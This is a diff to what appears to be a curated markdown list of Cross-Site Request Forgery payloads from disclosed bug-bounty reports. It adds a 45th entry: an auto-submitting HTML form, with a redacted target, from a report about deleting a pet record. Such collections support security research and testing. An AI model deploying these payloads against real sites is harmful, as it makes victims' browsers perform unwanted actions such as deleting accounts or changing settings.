@@ -1,6 +1,6 @@
 # Cross-Site Request Forgery
 
-44 payloads from disclosed reports.
+45 payloads from disclosed reports.
 
 ## Cross‑Site Request Forgery with hidden form auto‑submit to modify Slack 2FA settings
 
@@ -189,6 +189,23 @@
 ```
 
 — [CSRF to delete accounts \[HtUS\]](https://hackerone.com/reports/1629828) · U.S. Dept Of Defense · [nightm4re](https://hackerone.com/nightm4re)
+
+### `375dd962`
+
+```
+<html>
+  <body>
+    <form action="████">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+— [CSRF to delete a pet](https://hackerone.com/reports/2029753) · Mars · [d0rift](https://hackerone.com/d0rift)
 
 
 ## CSRF via an auto‑submitting hidden form that includes a captured authenticity_token
